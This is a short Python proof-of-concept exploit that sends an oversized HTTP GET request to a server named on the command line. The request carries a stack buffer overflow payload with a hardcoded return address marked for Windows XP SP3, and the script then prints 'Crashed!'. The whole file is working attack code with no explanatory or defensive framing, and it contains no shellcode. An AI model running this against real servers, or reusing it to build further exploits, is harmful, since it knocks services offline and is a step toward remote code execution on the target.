#!/usr/bin/env python

import sys, socket

if len(sys.argv) < 3:
	print('Usage: {n} <HOST> <PORT>'.format(n=sys.argv[0]))
        sys.exit(1)

cmd = 'GET'
# windows xp sp 3
buf = 'A' * 1788 + '\x9F\x31\x9D\x7C' + 'C'*(2220-1788-4)
end = 'HTTP/1.1\r\n\r\n'

payload = cmd+buf+end

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(payload)
s.close()

print('Crashed!')
